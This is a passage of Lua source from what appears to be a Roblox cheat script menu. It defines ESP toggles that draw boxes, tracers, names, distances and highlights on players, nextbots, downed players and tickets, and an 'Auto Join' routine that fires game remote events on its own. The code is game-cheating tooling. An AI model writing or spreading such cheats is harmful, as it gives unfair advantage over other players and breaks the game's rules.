end

Tabs.ESP:Section({ Title = "ESP", TextSize = 40 })
Tabs.ESP:Section({ Title = "Note: Enabling this higher amount Nextbot Player and ticket may coust your game to lag", TextSize = 10 })
Tabs.ESP:Divider()

Tabs.ESP:Section({ Title = "Player ESP" })

PlayerNameESPToggle = Tabs.ESP:Toggle({
    Title = "Player Name ESP",
    Flag = "PlayerNameESPToggle",
    Value = false,
    Callback = function(state)
        featureStates.PlayerESP.names = state
        if state or featureStates.PlayerESP.boxes or featureStates.PlayerESP.tracers or featureStates.PlayerESP.distance then
            startPlayerESP()
        else
            stopPlayerESP()
        end
    end
})

PlayerBoxESPToggle = Tabs.ESP:Toggle({
    Title = "Player Box ESP",
    Flag = "PlayerBoxESPToggle",
    Value = false,
    Callback = function(state)
        featureStates.PlayerESP.boxes = state
        if state or featureStates.PlayerESP.tracers or featureStates.PlayerESP.names or featureStates.PlayerESP.distance then
            startPlayerESP()
        else
            stopPlayerESP()
        end
    end
})

PlayerBoxTypeDropdown = Tabs.ESP:Dropdown({
    Title = "Player Box Type",
    Flag = "PlayerBoxTypeDropdown",
    Values = {"2D", "3D"},
    Value = "2D",
    Callback = function(value)
        featureStates.PlayerESP.boxType = value
    end
})

PlayerRainbowBoxesToggle = Tabs.ESP:Toggle({
    Title = "Player Rainbow Boxes",
    Flag = "PlayerRainbowBoxesToggle",
    Value = false,
    Callback = function(state)
        featureStates.PlayerESP.rainbowBoxes = state
        if featureStates.PlayerESP.boxes then
            stopPlayerESP()
            startPlayerESP()
        end
    end
})

PlayerTracerToggle = Tabs.ESP:Toggle({
    Title = "Player Tracer",
    Flag = "PlayerTracerToggle",
    Value = false,
    Callback = function(state)
        featureStates.PlayerESP.tracers = state
        if state or featureStates.PlayerESP.boxes or featureStates.PlayerESP.names or featureStates.PlayerESP.distance then
            startPlayerESP()
        else
            stopPlayerESP()
        end
    end
})

PlayerRainbowTracersToggle = Tabs.ESP:Toggle({
    Title = "Player Rainbow Tracers",
    Flag = "PlayerRainbowTracersToggle",
    Value = false,
    Callback = function(state)
        featureStates.PlayerESP.rainbowTracers = state
        if featureStates.PlayerESP.tracers then
            stopPlayerESP()
            startPlayerESP()
        end
    end
})

PlayerDistanceESPToggle = Tabs.ESP:Toggle({
    Title = "Player Distance ESP",
    Flag = "PlayerDistanceESPToggle",
    Value = false,
    Callback = function(state)
        featureStates.PlayerESP.distance = state
        if state or featureStates.PlayerESP.boxes or featureStates.PlayerESP.tracers or featureStates.PlayerESP.names then
            startPlayerESP()
        else
            stopPlayerESP()
        end
    end
})

PlayerHighlightsToggle = Tabs.ESP:Toggle({
    Title = "Player Highlights ESP",
    Flag = "PlayerHighlightsToggle",
    Value = false,
    Callback = function(state)
        PlayerHighlightsToggle = state
        if state then
            startPlayerHighlights()
        else
            stopPlayerHighlights()
        end
    end
})

Tabs.ESP:Section({ Title = "Nextbot Name ESP" })

NextbotESPToggle = Tabs.ESP:Toggle({
    Title = "Nextbot Name ESP",
    Flag = "NextbotESPToggle",
    Value = false,
    Callback = function(state)
        featureStates.NextbotESP.names = state
        if state then
            startNextbotESP()
            setupNextbotDetection()
        else
            stopNextbotESP()
        end
    end
})

NextbotBoxESPToggle = Tabs.ESP:Toggle({
    Title = "Nextbot Box ESP",
    Flag = "NextbotBoxESPToggle",
    Value = false,
    Callback = function(state)
        featureStates.NextbotESP.boxes = state
        if state or featureStates.NextbotESP.names or featureStates.NextbotESP.tracers or featureStates.NextbotESP.distance then
            startNextbotESP()
        else
            stopNextbotESP()
        end
    end
})

NextbotBoxTypeDropdown = Tabs.ESP:Dropdown({
    Title = "Nextbot Box Type",
    Flag = "NextbotBoxTypeDropdown",
    Values = {"2D", "3D"},
    Value = "2D",
    Callback = function(value)
        featureStates.NextbotESP.boxType = value
    end
})

NextbotRainbowBoxesToggle = Tabs.ESP:Toggle({
    Title = "Nextbot Rainbow Boxes",
    Flag = "NextbotRainbowBoxesToggle",
    Value = false,
    Callback = function(state)
        featureStates.NextbotESP.rainbowBoxes = state
        if featureStates.NextbotESP.boxes then
            stopNextbotESP()
            startNextbotESP()
        end
    end
})

NextbotTracerToggle = Tabs.ESP:Toggle({
    Title = "Nextbot Tracer",
    Flag = "NextbotTracerToggle",
    Value = false,
    Callback = function(state)
        featureStates.NextbotESP.tracers = state
        if state or featureStates.NextbotESP.names or featureStates.NextbotESP.boxes or featureStates.NextbotESP.distance then
            startNextbotESP()
        else
            stopNextbotESP()
        end
    end
})

NextbotRainbowTracersToggle = Tabs.ESP:Toggle({
    Title = "Nextbot Rainbow Tracers",
    Flag = "NextbotRainbowTracersToggle",
    Value = false,
    Callback = function(state)
        featureStates.NextbotESP.rainbowTracers = state
        if featureStates.NextbotESP.tracers then
            stopNextbotESP()
            startNextbotESP()
        end
    end
})

NextbotDistanceESPToggle = Tabs.ESP:Toggle({
    Title = "Nextbot Distance ESP",
    Flag = "NextbotDistanceESPToggle",
    Value = false,
    Callback = function(state)
        featureStates.NextbotESP.distance = state
        if state or featureStates.NextbotESP.names or featureStates.NextbotESP.boxes or featureStates.NextbotESP.tracers then
            startNextbotESP()
        else
            stopNextbotESP()
        end
    end
})

Tabs.ESP:Section({ Title = "Downed Player ESP" })

DownedBoxESPToggle = Tabs.ESP:Toggle({
    Title = "Downed Player Box ESP",
    Flag = "DownedBoxESPToggle",
    Value = false,
    Callback = function(state)
        featureStates.DownedBoxESP = state
        if state or featureStates.DownedTracer then
            if downedTracerConnection then stopDownedTracer() end
            startDownedTracer()
        else
            stopDownedTracer()
        end
    end
})

DownedBoxTypeDropdown = Tabs.ESP:Dropdown({
    Title = "Downed Box Type",
    Flag = "DownedBoxTypeDropdown",
    Values = {"2D", "3D"},
    Value = "2D",
    Callback = function(value)
        featureStates.DownedBoxType = value
    end
})

DownedTracerToggle = Tabs.ESP:Toggle({
    Title = "Downed Player Tracer",
    Flag = "DownedTracerToggle",
    Value = false,
    Callback = function(state)
        featureStates.DownedTracer = state
        if state or featureStates.DownedBoxESP then
            if downedTracerConnection then stopDownedTracer() end
            startDownedTracer()
        else
            stopDownedTracer()
        end
    end
})

DownedNameESPToggle = Tabs.ESP:Toggle({
    Title = "Downed Player Name ESP",
    Flag = "DownedNameESPToggle",
    Value = false,
    Callback = function(state)
        featureStates.DownedNameESP = state
        if state then
            startDownedNameESP()
        else
            stopDownedNameESP()
        end
    end
})

DownedDistanceESPToggle = Tabs.ESP:Toggle({
    Title = "Downed Player Distance ESP",
    Flag = "DownedDistanceESPToggle",
    Value = false,
    Callback = function(state)
        featureStates.DownedDistanceESP = state
        if featureStates.DownedNameESP then
            stopDownedNameESP()
            startDownedNameESP()
        end
    end
})
Players = game:GetService("Players")
RunService = game:GetService("RunService")
UserInputService = game:GetService("UserInputService")

player = Players.LocalPlayer

PlayerHighlightsEnabled = false
DownedHighlightsEnabled = false

HighlightsConnection = nil
cachedPlayers = {}
lastPlayerCacheUpdate = 0
isRendering = true
windowFocused = true

function IsAlive(plr)
    character = plr.Character
    if not character then return false end
    
    humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return false end
    
    return humanoid.Health > 0
end

function IsDowned(character)
    return character:GetAttribute("Downed") == true
end

function getCachedPlayers()
    if tick() - lastPlayerCacheUpdate < 1 then
        return cachedPlayers
    end
    
    lastPlayerCacheUpdate = tick()
    cachedPlayers = Players:GetPlayers()
    return cachedPlayers
end

function clearAllHighlights()
    for _, plr in pairs(getCachedPlayers()) do
        if plr.Character then
            highlight = plr.Character:FindFirstChild("PlayerHighlight")
            if highlight then
                highlight:Destroy()
            end
        end
    end
end

function updateRoleHighlights()
    if not isRendering or not windowFocused then
        return
    end
    
    players = getCachedPlayers()

    for _, plr in ipairs(players) do
        if plr ~= player and plr.Character then
            model = plr.Character
            highlight = model:FindFirstChild("PlayerHighlight")
            isAlive = IsAlive(plr)
            isDowned = IsDowned(model)
            
            shouldShowHighlight = false
            if PlayerHighlightsEnabled and isAlive and not isDowned then
                shouldShowHighlight = true
            elseif DownedHighlightsEnabled and isDowned then
                shouldShowHighlight = true
            end
            
            if shouldShowHighlight then
                if isDowned then
                    fillColor = Color3.fromRGB(255, 165, 0)
                    outlineColor = Color3.fromRGB(200, 120, 0)
                else
                    fillColor = Color3.fromRGB(0, 225, 0)
                    outlineColor = Color3.fromRGB(0, 150, 0)
                end
                
                if not highlight then
                    highlight = Instance.new("Highlight")
                    highlight.Name = "PlayerHighlight"
                    highlight.Adornee = model
                    highlight.FillTransparency = 0.5
                    highlight.OutlineTransparency = 0
                    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                    highlight.Parent = model
                end
                highlight.FillColor = fillColor
                highlight.OutlineColor = outlineColor
                highlight.Enabled = true
            else
                if highlight then
                    highlight:Destroy()
                end
            end
        end
    end
end

function startPlayerHighlights()
    PlayerHighlightsEnabled = true
    manageHighlightsConnection()
end

function stopPlayerHighlights()
    PlayerHighlightsEnabled = false
    manageHighlightsConnection()
end

function startDownedHighlights()
    DownedHighlightsEnabled = true
    manageHighlightsConnection()
end

function stopDownedHighlights()
    DownedHighlightsEnabled = false
    manageHighlightsConnection()
end

function manageHighlightsConnection()
    shouldRun = PlayerHighlightsEnabled or DownedHighlightsEnabled
    
    if shouldRun then
        if not HighlightsConnection then
            HighlightsConnection = RunService.Heartbeat:Connect(updateRoleHighlights)
        end
    else
        if HighlightsConnection then
            HighlightsConnection:Disconnect()
            HighlightsConnection = nil
            clearAllHighlights()
        end
    end
end

RunService.RenderStepped:Connect(function()
    isRendering = true
end)

lastRenderTime = tick()
renderCheckConnection = RunService.Heartbeat:Connect(function()
    currentTime = tick()
    
    if currentTime - lastRenderTime > 1 then
        isRendering = false
        clearAllHighlights()
    end
end)

RunService.RenderStepped:Connect(function()
    lastRenderTime = tick()
    isRendering = true
end)

UserInputService.WindowFocusReleased:Connect(function()
    windowFocused = false
    isRendering = false
    clearAllHighlights()
end)

UserInputService.WindowFocused:Connect(function()
    windowFocused = true
    isRendering = true
end)

game:GetService("GuiService"):GetPropertyChangedSignal("MenuIsOpen"):Connect(function()
    if game:GetService("GuiService").MenuIsOpen then
        isRendering = false
        clearAllHighlights()
    else
        isRendering = true
    end
end)

Players.PlayerRemoving:Connect(function(plr)
    if plr.Character then
        highlight = plr.Character:FindFirstChild("PlayerHighlight")
        if highlight then
            highlight:Destroy()
        end
    end
end)

function cleanup()
    if HighlightsConnection then
        HighlightsConnection:Disconnect()
        HighlightsConnection = nil
    end
    if renderCheckConnection then
        renderCheckConnection:Disconnect()
    end
    clearAllHighlights()
end

game:GetService("ScriptContext").DescendantRemoving:Connect(function(descendant)
    if descendant == script then
        cleanup()
    end
end)
DownedHighlightsToggle = Tabs.ESP:Toggle({
    Title = "Downed Highlights ESP",
    Flag = "DownedHighlightsToggle",
    Value = false,
    Callback = function(state)
        DownedHighlightsToggle = state
        if state then
            startDownedHighlights()
        else
            stopDownedHighlights()
        end
    end
})
Tabs.ESP:Section({ Title = "Ticket ESP" })
local function cleanupDrawings(drawingTable)
    for ticket, drawings in pairs(drawingTable or {}) do
        pcall(function()
            if drawings and type(drawings) == "table" then
                for _, drawing in ipairs(drawings) do
                    if drawing and drawing.Remove then
                        drawing:Remove()
                    end
                end
            elseif drawings and drawings.Remove then
                drawings:Remove()
            end
        end)
        drawingTable[ticket] = nil
    end
    return {}
end

local function cleanupHighlights(highlightTable)
    for _, highlight in pairs(highlightTable or {}) do
        pcall(function()
            if highlight and highlight.Destroy then
                highlight:Destroy()
            end
        end)
    end
    return {}
end

TicketEspToggle = Tabs.ESP:Toggle({
    Title = "Ticket ESP",
    Flag = "TicketEspToggle",
    Value = false,
    Callback = function(state)
        if not state then
            if getgenv().ticketEspConnections then
                for _, connection in ipairs(getgenv().ticketEspConnections) do
                    connection:Disconnect()
                end
                getgenv().ticketEspConnections = nil
                task.wait(0.5)
                if getgenv().ticketEspLabels then
                    getgenv().ticketEspLabels = cleanupDrawings(getgenv().ticketEspLabels)
                end
            end
            return
        end

        getgenv().ticketEspConnections = getgenv().ticketEspConnections or {}
        getgenv().ticketEspLabels = getgenv().ticketEspLabels or {}
        
        for _, connection in ipairs(getgenv().ticketEspConnections) do
            connection:Disconnect()
        end
        getgenv().ticketEspConnections = {}
        getgenv().ticketEspLabels = cleanupDrawings(getgenv().ticketEspLabels)

        local tickets = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Effects") and workspace.Game.Effects:FindFirstChild("Tickets")
        if not tickets then return end

        local function updateEsp()
            if not tickets then return end
            
            for ticket, label in pairs(getgenv().ticketEspLabels) do
                if not ticket.Parent or not ticket:FindFirstChild("HumanoidRootPart") then
                    label:Remove()
                    getgenv().ticketEspLabels[ticket] = nil
                end
            end
            
            for _, ticket in ipairs(tickets:GetChildren()) do
                if ticket:FindFirstChild("HumanoidRootPart") and not getgenv().ticketEspLabels[ticket] then
                    local label = Drawing.new("Text")
                    label.Visible = false
                    label.Text = "Ticket"
                    label.Color = Color3.fromRGB(0, 0, 255)
                    label.Size = 20
                    label.Center = true
                    label.Outline = true
                    getgenv().ticketEspLabels[ticket] = label
                end
            end
            
            local camera = workspace.CurrentCamera
            if not camera then return end
            for ticket, label in pairs(getgenv().ticketEspLabels) do
                local ticketPart = ticket:FindFirstChild("HumanoidRootPart")
                if ticketPart then
                    local screenPos, onScreen = camera:WorldToViewportPoint(ticketPart.Position)
                    label.Visible = onScreen
                    if onScreen then
                        label.Position = Vector2.new(screenPos.X, screenPos.Y - 30)
                    end
                end
            end
        end
        
        task.spawn(updateEsp)
        
        table.insert(getgenv().ticketEspConnections, RunService.RenderStepped:Connect(function()
            task.spawn(updateEsp)
        end))
        table.insert(getgenv().ticketEspConnections, tickets.ChildAdded:Connect(updateEsp))
        table.insert(getgenv().ticketEspConnections, tickets.ChildRemoved:Connect(updateEsp))
    end
})

TicketTracerEspToggle = Tabs.ESP:Toggle({
    Title = "Ticket Tracer ESP",
    Flag = "TicketTracerEspToggle",
    Value = false,
    Callback = function(state)
        if not state then
            if getgenv().ticketTracerConnections then
                for _, connection in ipairs(getgenv().ticketTracerConnections) do
                    connection:Disconnect()
                end
                getgenv().ticketTracerConnections = nil
                task.wait(0.5)
                if getgenv().ticketTracerDrawings then
                    getgenv().ticketTracerDrawings = cleanupDrawings(getgenv().ticketTracerDrawings)
                end
            end
            return
        end

        getgenv().ticketTracerConnections = getgenv().ticketTracerConnections or {}
        getgenv().ticketTracerDrawings = getgenv().ticketTracerDrawings or {}
        
        for _, connection in ipairs(getgenv().ticketTracerConnections) do
            connection:Disconnect()
        end
        getgenv().ticketTracerConnections = {}
        getgenv().ticketTracerDrawings = cleanupDrawings(getgenv().ticketTracerDrawings)

        local tickets = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Effects") and workspace.Game.Effects:FindFirstChild("Tickets")
        if not tickets then return end

        local function updateTracerEsp()
            if not tickets then return end
            
            for ticket, drawings in pairs(getgenv().ticketTracerDrawings) do
                if not ticket.Parent or not ticket:FindFirstChild("HumanoidRootPart") then
                    cleanupDrawings({[ticket] = drawings})
                    getgenv().ticketTracerDrawings[ticket] = nil
                end
            end
            
            for _, ticket in ipairs(tickets:GetChildren()) do
                if ticket:FindFirstChild("HumanoidRootPart") and not getgenv().ticketTracerDrawings[ticket] then
                    local tracer = Drawing.new("Line")
                    tracer.Visible = false
                    tracer.Color = Color3.fromRGB(0, 0, 255)
                    tracer.Thickness = 2
                    tracer.Transparency = 1
                    getgenv().ticketTracerDrawings[ticket] = {tracer}
                end
            end
            
            local camera = workspace.CurrentCamera
            if not camera then return end
            local screenBottomCenter = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y)
            for ticket, drawings in pairs(getgenv().ticketTracerDrawings) do
                local ticketPart = ticket:FindFirstChild("HumanoidRootPart")
                if ticketPart then
                    local screenPos, onScreen = camera:WorldToViewportPoint(ticketPart.Position)
                    drawings[1].Visible = onScreen
                    if onScreen then
                        drawings[1].From = screenBottomCenter
                        drawings[1].To = Vector2.new(screenPos.X, screenPos.Y)
                    end
                end
            end
        end
        
        task.spawn(updateTracerEsp)
        
        table.insert(getgenv().ticketTracerConnections, RunService.RenderStepped:Connect(function()
            task.spawn(updateTracerEsp)
        end))
        table.insert(getgenv().ticketTracerConnections, tickets.ChildAdded:Connect(updateTracerEsp))
        table.insert(getgenv().ticketTracerConnections, tickets.ChildRemoved:Connect(updateTracerEsp))
    end
})

TicketDistanceEspToggle = Tabs.ESP:Toggle({
    Title = "Ticket Distance ESP",
    Flag = "TicketDistanceEspToggle",
    Value = false,
    Callback = function(state)
        if not state then
            if getgenv().ticketDistanceConnections then
                for _, connection in ipairs(getgenv().ticketDistanceConnections) do
                    connection:Disconnect()
                end
                getgenv().ticketDistanceConnections = nil
                task.wait(0.5)
                if getgenv().ticketDistanceLabels then
                    getgenv().ticketDistanceLabels = cleanupDrawings(getgenv().ticketDistanceLabels)
                end
            end
            return
        end

        getgenv().ticketDistanceConnections = getgenv().ticketDistanceConnections or {}
        getgenv().ticketDistanceLabels = getgenv().ticketDistanceLabels or {}
        
        for _, connection in ipairs(getgenv().ticketDistanceConnections) do
            connection:Disconnect()
        end
        getgenv().ticketDistanceConnections = {}
        getgenv().ticketDistanceLabels = cleanupDrawings(getgenv().ticketDistanceLabels)

        local tickets = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Effects") and workspace.Game.Effects:FindFirstChild("Tickets")
        if not tickets then return end

        local function updateDistanceEsp()
            if not tickets then return end
            
            for ticket, label in pairs(getgenv().ticketDistanceLabels) do
                if not ticket.Parent or not ticket:FindFirstChild("HumanoidRootPart") then
                    label:Remove()
                    getgenv().ticketDistanceLabels[ticket] = nil
                end
            end
            
            for _, ticket in ipairs(tickets:GetChildren()) do
                if ticket:FindFirstChild("HumanoidRootPart") and not getgenv().ticketDistanceLabels[ticket] then
                    local distanceLabel = Drawing.new("Text")
                    distanceLabel.Visible = false
                    distanceLabel.Text = "0m"
                    distanceLabel.Color = Color3.fromRGB(0, 0, 255)
                    distanceLabel.Size = 16
                    distanceLabel.Center = true
                    distanceLabel.Outline = true
                    getgenv().ticketDistanceLabels[ticket] = distanceLabel
                end
            end
            
            local character = player.Character
            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
            local camera = workspace.CurrentCamera
            if not camera or not humanoidRootPart then return end
            for ticket, label in pairs(getgenv().ticketDistanceLabels) do
                local ticketPart = ticket:FindFirstChild("HumanoidRootPart")
                if ticketPart then
                    local screenPos, onScreen = camera:WorldToViewportPoint(ticketPart.Position)
                    label.Visible = onScreen
                    if onScreen then
                        local distance = (ticketPart.Position - humanoidRootPart.Position).Magnitude
                        label.Text = string.format("%.1fm", distance)
                        label.Position = Vector2.new(screenPos.X, screenPos.Y + 20)
                    end
                end
            end
        end
        
        task.spawn(updateDistanceEsp)
        
        table.insert(getgenv().ticketDistanceConnections, RunService.RenderStepped:Connect(function()
            task.spawn(updateDistanceEsp)
        end))
        table.insert(getgenv().ticketDistanceConnections, tickets.ChildAdded:Connect(updateDistanceEsp))
        table.insert(getgenv().ticketDistanceConnections, tickets.ChildRemoved:Connect(updateDistanceEsp))
    end
})

HighlightsTicketEspToggle = Tabs.ESP:Toggle({
    Title = "Highlights Ticket ESP",
    Flag = "HighlightsTicketEspToggle",
    Value = false,
    Callback = function(state)
        if not state then
            if getgenv().ticketHighlightConnections then
                for _, connection in ipairs(getgenv().ticketHighlightConnections) do
                    connection:Disconnect()
                end
                getgenv().ticketHighlightConnections = nil
                task.wait(0.5)
                if getgenv().ticketHighlights then
                    getgenv().ticketHighlights = cleanupHighlights(getgenv().ticketHighlights)
                end
            end
            return
        end

        getgenv().ticketHighlightConnections = getgenv().ticketHighlightConnections or {}
        getgenv().ticketHighlights = getgenv().ticketHighlights or {}
        
        for _, connection in ipairs(getgenv().ticketHighlightConnections) do
            connection:Disconnect()
        end
        getgenv().ticketHighlightConnections = {}
        getgenv().ticketHighlights = cleanupHighlights(getgenv().ticketHighlights)

        local tickets = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Effects") and workspace.Game.Effects:FindFirstChild("Tickets")
        if not tickets then return end

        local function updateHighlights()
            if not tickets then return end
            
            for ticket, highlight in pairs(getgenv().ticketHighlights) do
                if not ticket.Parent or not ticket:FindFirstChild("HumanoidRootPart") then
                    highlight:Destroy()
                    getgenv().ticketHighlights[ticket] = nil
                end
            end
            
            for _, ticket in ipairs(tickets:GetChildren()) do
                if ticket:FindFirstChild("HumanoidRootPart") and not getgenv().ticketHighlights[ticket] then
                    local highlight = Instance.new("Highlight")
                    highlight.Adornee = ticket
                    highlight.FillColor = Color3.fromRGB(0, 0, 255)
                    highlight.OutlineColor = Color3.fromRGB(0, 0, 255)
                    highlight.FillTransparency = 0.5
                    highlight.OutlineTransparency = 0
                    highlight.Parent = ticket
                    getgenv().ticketHighlights[ticket] = highlight
                end
            end
        end
        
        task.spawn(updateHighlights)
        
        table.insert(getgenv().ticketHighlightConnections, RunService.RenderStepped:Connect(function()
            task.spawn(updateHighlights)
        end))
        table.insert(getgenv().ticketHighlightConnections, tickets.ChildAdded:Connect(updateHighlights))
        table.insert(getgenv().ticketHighlightConnections, tickets.ChildRemoved:Connect(updateHighlights))
    end
})

TicketBoxEspToggle = Tabs.ESP:Toggle({
    Title = "Ticket Box ESP",
    Flag = "TicketBoxEspToggle",
    Value = false,
    Callback = function(state)
        if not state then
            if getgenv().ticketBoxConnections then
                for _, connection in ipairs(getgenv().ticketBoxConnections) do
                    connection:Disconnect()
                end
                getgenv().ticketBoxConnections = nil
                task.wait(0.5)
                if getgenv().ticketBoxDrawings then
                    getgenv().ticketBoxDrawings = cleanupDrawings(getgenv().ticketBoxDrawings)
                end
            end
            return
        end

        getgenv().ticketBoxConnections = getgenv().ticketBoxConnections or {}
        getgenv().ticketBoxDrawings = getgenv().ticketBoxDrawings or {}
        
        for _, connection in ipairs(getgenv().ticketBoxConnections) do
            connection:Disconnect()
        end
        getgenv().ticketBoxConnections = {}
        getgenv().ticketBoxDrawings = cleanupDrawings(getgenv().ticketBoxDrawings)

        local tickets = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Effects") and workspace.Game.Effects:FindFirstChild("Tickets")
        if not tickets then return end

        local function updateBoxEsp()
            if not tickets then return end
            
            for ticket, drawings in pairs(getgenv().ticketBoxDrawings) do
                local is2D = type(drawings[1]) ~= "table"
                local expected2D = getgenv().ticketBoxType == "2D"
                if not ticket.Parent or not ticket:FindFirstChild("HumanoidRootPart") or is2D ~= expected2D then
                    cleanupDrawings({[ticket] = drawings})
                    getgenv().ticketBoxDrawings[ticket] = nil
                end
            end
            
            for _, ticket in ipairs(tickets:GetChildren()) do
                if ticket:FindFirstChild("HumanoidRootPart") and not getgenv().ticketBoxDrawings[ticket] then
                    local drawings = {}
                    if getgenv().ticketBoxType == "2D" then
                        local box = Drawing.new("Square")
                        box.Visible = false
                        box.Color = Color3.fromRGB(0, 0, 255)
                        box.Thickness = 2
                        box.Filled = false
                        drawings = {box}
                    else
                        drawings = {}
                        for i = 1, 12 do
                            local line = Drawing.new("Line")
                            line.Visible = false
                            line.Color = Color3.fromRGB(0, 0, 255)
                            line.Thickness = 2
                            line.Transparency = 1
                            table.insert(drawings, line)
                        end
                    end
                    getgenv().ticketBoxDrawings[ticket] = drawings
                end
            end
            
            local camera = workspace.CurrentCamera
            if not camera then return end
            for ticket, drawings in pairs(getgenv().ticketBoxDrawings) do
                local ticketPart = ticket:FindFirstChild("HumanoidRootPart")
                if ticketPart then
                    local screenPos, onScreen = camera:WorldToViewportPoint(ticketPart.Position)
                    if onScreen then
                        if getgenv().ticketBoxType == "2D" then
                            local topY = camera:WorldToViewportPoint(ticketPart.Position + Vector3.new(0, 2, 0)).Y
                            local bottomY = camera:WorldToViewportPoint(ticketPart.Position - Vector3.new(0, 2, 0)).Y
                            local size = (bottomY - topY) / 2
                            drawings[1].Size = Vector2.new(size * 2, size * 2)
                            drawings[1].Position = Vector2.new(screenPos.X - size, screenPos.Y - size)
                            drawings[1].Visible = true
                        else
                            local boxSize = Vector3.new(4, 4, 4)
                            local offsets = {
                                Vector3.new( boxSize.X/2,  boxSize.Y/2,  boxSize.Z/2),
                                Vector3.new( boxSize.X/2,  boxSize.Y/2, -boxSize.Z/2),
                                Vector3.new( boxSize.X/2, -boxSize.Y/2,  boxSize.Z/2),
                                Vector3.new( boxSize.X/2, -boxSize.Y/2, -boxSize.Z/2),
                                Vector3.new(-boxSize.X/2,  boxSize.Y/2,  boxSize.Z/2),
                                Vector3.new(-boxSize.X/2,  boxSize.Y/2, -boxSize.Z/2),
                                Vector3.new(-boxSize.X/2, -boxSize.Y/2,  boxSize.Z/2),
                                Vector3.new(-boxSize.X/2, -boxSize.Y/2, -boxSize.Z/2),
                            }
                            local screenPoints = {}
                            local anyPointOnScreen = false
                            for i, offset in ipairs(offsets) do
                                local worldPos = ticketPart.CFrame * offset
                                local vec, onScreenPoint = camera:WorldToViewportPoint(worldPos)
                                screenPoints[i] = {pos = Vector2.new(vec.X, vec.Y), depth = vec.Z}
                                if onScreenPoint and vec.Z > 0 then
                                    anyPointOnScreen = true
                                end
                            end
                            local edges = {
                                {1, 2}, {1, 3}, {1, 5},
                                {2, 4}, {2, 6},
                                {3, 4}, {3, 7},
                                {5, 6}, {5, 7},
                                {4, 8}, {6, 8}, {7, 8}
                            }
                            for i, edge in ipairs(edges) do
                                local line = drawings[i]
                                if line then
                                    local p1 = screenPoints[edge[1]]
                                    local p2 = screenPoints[edge[2]]
                                    if anyPointOnScreen and p1.depth > 0 and p2.depth > 0 then
                                        line.From = p1.pos
                                        line.To = p2.pos
                                        line.Visible = true
                                    else
                                        line.Visible = false
                                    end
                                end
                            end
                        end
                    else
                        for _, drawing in ipairs(drawings) do
                            drawing.Visible = false
                        end
                    end
                end
            end
        end
        
        task.spawn(updateBoxEsp)
        
        table.insert(getgenv().ticketBoxConnections, RunService.RenderStepped:Connect(function()
            task.spawn(updateBoxEsp)
        end))
        table.insert(getgenv().ticketBoxConnections, tickets.ChildAdded:Connect(updateBoxEsp))
        table.insert(getgenv().ticketBoxConnections, tickets.ChildRemoved:Connect(updateBoxEsp))
    end
})

BoxticketTypeDropdown = Tabs.ESP:Dropdown({
    Title = "Box Type",
    Flag = "BoxticketTypeDropdown",
    Values = {"2D", "3D"},
    Value = "2D",
    Callback = function(value)
        getgenv().ticketBoxType = value
        if getgenv().ticketBoxDrawings then
            getgenv().ticketBoxDrawings = cleanupDrawings(getgenv().ticketBoxDrawings)
        end
    end
})
    -- Auto Tab
    Tabs.Auto:Section({ Title = "Auto", TextSize = 40 })
    
     AutoJoin = Tabs.Auto:Toggle({
    Title = "Auto Join",
    Flag = "AutoJoin",
    Value = false,
    Callback = function(state)
        getgenv().AutoJoinEnabled = state
        
        if state then
            local Players = game:GetService("Players")
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local LocalPlayer = Players.LocalPlayer

            local statsFolder = workspace:WaitForChild("Game"):WaitForChild("Stats")
            local hasRunThisRound = false
            local isExecuting = false

            local function isPlayerAlive()
                local character = LocalPlayer.Character
                if not character then return false end
                
                local humanoid = character:FindFirstChild("Humanoid")
                if not humanoid then return false end
                
                return humanoid.Health > 0
            end

            local function executeScript()
                if isExecuting then return end
                
                if isPlayerAlive() then
                    return
                end
                
                isExecuting = true
                
                local success = pcall(function()
                    game:GetService("ReplicatedStorage").Events.Player.ChangePlayerMode:FireServer(true)
                end)
                
                if success then
                    hasRunThisRound = true
                else
                    hasRunThisRound = false
                end
                
                isExecuting = false
            end

            local function checkTimerEnd()
                local timerValue = statsFolder:GetAttribute("Timer")
                local roundStarted = statsFolder:GetAttribute("RoundStarted")
                
                if timerValue == 0 and roundStarted == true then
                    if not hasRunThisRound then
                        executeScript()
                    end
                end
                
                if roundStarted == false then
                    hasRunThisRound = false
                end
            end

            local function onPlayerDied()
                if not hasRunThisRound then
                    executeScript()
                end
            end

            local function onGetLives()
                if not hasRunThisRound then
                    executeScript()
                end
            end

            getgenv().AutoJoinConnections = {
                timerConnection = statsFolder:GetAttributeChangedSignal("Timer"):Connect(checkTimerEnd),
                heartbeatConnection = game:GetService("RunService").Heartbeat:Connect(function()
                    local timerValue = statsFolder:GetAttribute("Timer")
                    local roundStarted = statsFolder:GetAttribute("RoundStarted")
                    
                    if timerValue == 0 and roundStarted == true and not hasRunThisRound then
                        executeScript()
                    end
                end),
                roundConnection = statsFolder:GetAttributeChangedSignal("RoundStarted"):Connect(function()
                    local roundStarted = statsFolder:GetAttribute("RoundStarted")
                    if roundStarted == false then
                        hasRunThisRound = false
                    end
                end)
            }

            getgenv().AutoJoinConnections.characterAddedConnection = LocalPlayer.CharacterAdded:Connect(function(character)
                local humanoid = character:WaitForChild("Humanoid")
                
                getgenv().AutoJoinConnections.humanoidDiedConnection = humanoid.Died:Connect(function()
                    local downed = character:GetAttribute("Downed")
                    if downed ~= true then
                        onPlayerDied()
                    end
                end)
            end)

            if LocalPlayer.Character then
                local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
                if humanoid then
                    getgenv().AutoJoinConnections.humanoidDiedConnection = humanoid.Died:Connect(function()
                        local downed = LocalPlayer.Character:GetAttribute("Downed")
                        if downed ~= true then
                            onPlayerDied()
                        end
                    end)
                end
            end

            getgenv().AutoJoinConnections.getLivesConnection = ReplicatedStorage.Events.Data.GetLives.OnClientEvent:Connect(function()
                onGetLives()
            end)

            task.spawn(function()
                local success = pcall(function()
                    ReplicatedStorage.Events.Data.GetLives:FireServer()
                end)
            end)

        else
            if getgenv().AutoJoinConnections then
                for name, connection in pairs(getgenv().AutoJoinConnections) do
                    if connection then
                        connection:Disconnect()
